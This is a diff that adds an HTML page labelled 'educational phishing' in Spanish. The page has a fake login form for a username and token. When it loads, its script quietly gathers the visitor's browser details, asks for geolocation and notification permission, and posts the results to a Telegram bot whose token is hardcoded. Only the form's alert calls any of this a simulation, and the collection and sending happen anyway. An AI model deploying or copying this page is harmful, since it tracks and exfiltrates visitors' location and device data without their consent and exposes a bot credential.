@@ -1,1 +1,148 @@
-<h1><font color="red">loro pepe</font></h1>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Phishing Educativo</title>
+  <style>
+    body {
+      background-color: #111;
+      color: #0ff;
+      font-family: 'Courier New', monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      animation: fadeIn 2s ease-in;
+    }
+
+    h1 {
+      font-size: 2.5rem;
+      color: #0ff;
+      text-shadow: 0 0 10px #0ff;
+    }
+
+    h2 {
+      font-size: 1rem;
+      color: #f0f;
+      margin-bottom: 30px;
+      text-shadow: 0 0 5px #f0f;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      width: 300px;
+      gap: 10px;
+      animation: slideUp 1.5s ease-out;
+    }
+
+    input {
+      padding: 10px;
+      background: #222;
+      border: 1px solid #0ff;
+      color: #0ff;
+    }
+
+    button {
+      padding: 10px;
+      background: #0ff;
+      color: #000;
+      font-weight: bold;
+      border: none;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background: #0cc;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @keyframes slideUp {
+      from { transform: translateY(30px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+  <h1>BIENVENIDOS</h1>
+  <h2>SI QUIERE OBTENER SU TOKEN Y USUARIO ME HABLE AL PRIVADO: +000000000</h2>
+
+  <form onsubmit="mostrarAlerta(); return false;">
+    <input type="text" placeholder="Usuario" required>
+    <input type="text" placeholder="Token" required>
+    <button type="submit">Iniciar sesión</button>
+  </form>
+
+  <script>
+    // Recolección de datos simulada
+    const datos = {
+      agente: navigator.userAgent,
+      idioma: navigator.language,
+      plataforma: navigator.platform,
+      ancho: screen.width,
+      alto: screen.height,
+      hora: new Date().toLocaleString()
+    };
+
+    // Solicitar permisos de ubicación
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        datos.latitud = position.coords.latitude;
+        datos.longitud = position.coords.longitude;
+      }, function(error) {
+        console.error('Error al obtener la ubicación:', error);
+      });
+    } else {
+      console.log('Geolocalización no soportada por este navegador.');
+    }
+
+    // Solicitar permisos de notificaciones
+    if ('Notification' in window) {
+      Notification.requestPermission().then(permission => {
+        if (permission === 'granted') {
+          datos.notificaciones = 'Permitidas';
+        } else {
+          datos.notificaciones = 'Denegadas';
+        }
+      });
+    } else {
+      datos.notificaciones = 'No soportadas';
+    }
+
+    // Enviar al bot de Telegram
+    const ID = "7955801451";
+    const TOKEN = "7954403558:AAEHLKfq6bhiMUb1GjCSjLitLtO-rY7XEqI";
+    const mensaje = `
+📡 NUEVA VISITA EDUCATIVA:
+🌐 User-Agent: ${datos.agente}
+🗣️ Idioma: ${datos.idioma}
+💻 Plataforma: ${datos.plataforma}
+📏 Resolución: ${datos.ancho}x${datos.alto}
+🕒 Fecha/Hora: ${datos.hora}
+📍 Latitud: ${datos.latitud || 'No disponible'}
+📍 Longitud: ${datos.longitud || 'No disponible'}
+🔔 Notificaciones: ${datos.notificaciones}
+    `;
+
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: ID,
+        text: mensaje
+      })
+    });
+
+    function mostrarAlerta() {
+      alert("⚠️ NO DEBES CAER EN ESTAS COSAS ⚠️\nEsto fue una simulación educativa.");
+    }
+  </script>
+</body>
+</html>
